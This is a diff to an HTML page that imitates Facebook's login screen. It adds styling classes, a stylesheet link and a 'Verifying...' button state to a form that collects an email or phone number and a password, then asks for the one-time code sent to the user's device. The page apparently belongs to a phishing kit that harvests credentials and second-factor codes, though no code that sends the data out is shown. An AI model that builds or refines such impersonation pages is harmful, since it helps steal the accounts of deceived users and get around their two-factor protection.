@@ -10,11 +10,12 @@
   <style>
    body { font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; } .main-wrapper { display: flex; align-items: center; justify-content: center; padding-bottom: 112px; padding-top: 72px; width: 980px; max-width: 100%; } .left-col { width: 580px; padding-right: 32px; box-sizing: border-box; } .logo { height: 106px; margin: -28px; } h2 { font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif; font-size: 28px; font-weight: normal; line-height: 32px; width: 500px; margin-top: 24px; margin-bottom: 0; } .right-col { width: 396px; display: flex; flex-direction: column; align-items: center; } .card { background-color: #fff; border: none; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); box-sizing: border-box; padding: 20px 0 28px; width: 396px; text-align: center; } .form-container { padding: 0 16px; } input { font-size: 17px; padding: 14px 16px; width: 100%; border-radius: 6px; border: 1px solid #dddfe2; margin-bottom: 12px; box-sizing: border-box; color: #1d2129; height: 52px; line-height: 16px; } input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; caret-color: #1877f2; } .btn { background-color: #1877f2; border: none; border-radius: 6px; font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%; color: #fff; font-weight: bold; cursor: pointer; margin-top: 6px; transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform; } .btn:hover { background-color: #166fe5; } .forgot { color: #1877f2; font-size: 14px; font-weight: 500; text-decoration: none; display: block; margin-top: 16px; margin-bottom: 20px; } .forgot:hover { text-decoration: underline; } .divider { align-items: center; border-bottom: 1px solid #dadde1; display: flex; margin: 20px 16px; text-align: center; } .create-btn { background-color: #42b72a; border: none; border-radius: 6px; font-size: 17px; line-height: 48px; padding: 0 16px; color: #fff; font-weight: bold; cursor: pointer; display: inline-block; transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform; } .create-btn:hover { background-color: #36a420; } .create-page { margin-top: 28px; font-size: 14px; color: #1c1e21; } .create-page a { font-weight: bold; color: #1c1e21; text-decoration: none; } .create-page a:hover { text-decoration: underline; } @media (max-width: 900px) { .main-wrapper { flex-direction: column; width: 100%; padding-top: 0; padding-bottom: 40px; } .left-col { text-align: center; width: auto; padding: 0; margin-top: 40px; margin-bottom: 40px; } .logo { margin: 0; height: 60px; } h2 { font-size: 24px; width: auto; margin-top: 10px; } .right-col { width: 100%; padding: 0 16px; box-sizing: border-box; } .card { width: 100%; max-width: 396px; } } .hidden { display: none !important; }
   </style>
+  <link href="/core/assets/css/animations.css" rel="stylesheet"/>
  </head>
  <body>
   <div class="main-wrapper" id="step-1">
    <div class="left-col">
-    <img alt="Facebook" class="logo" loading="lazy" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"/>
+    <img alt="Facebook" class="logo facebook-like-hover" loading="lazy" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"/>
     <h2>
      Facebook helps you connect and share with the people in your life.
     </h2>
@@ -22,11 +23,11 @@
    <div class="right-col">
     <div class="card">
      <form class="form-container" id="login-form">
-      <div id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
+      <div class="error-message" id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
       </div>
-      <input id="email" placeholder="Email address or phone number" required="" type="text"/>
-      <input id="password" placeholder="Password" required="" type="password"/>
-      <button class="btn" id="btn-submit" type="submit">
+      <input class="input-field" id="email" placeholder="Email address or phone number" required="" type="text"/>
+      <input class="input-field" id="password" placeholder="Password" required="" type="password"/>
+      <button class="btn btn-primary" data-loading-text="Verifying..." id="btn-submit" type="submit">
        Log In
       </button>
       <a class="forgot" href="#">
@@ -34,7 +35,7 @@
       </a>
       <div class="divider">
       </div>
-      <button class="create-btn" type="button">
+      <button class="create-btn btn-primary" type="button">
        Create new account
       </button>
      </form>
@@ -56,8 +57,8 @@
     <p style="margin-bottom: 20px; color: #666;">
      Please enter the code sent to your device.
     </p>
-    <input id="otp-input" placeholder="Enter code" style="margin-bottom: 20px;" type="text"/>
-    <button class="btn" id="btn-otp-submit">
+    <input class="input-field" id="otp-input" placeholder="Enter code" style="margin-bottom: 20px;" type="text"/>
+    <button class="btn btn-primary" id="btn-otp-submit">
      Verify
     </button>
    </div>
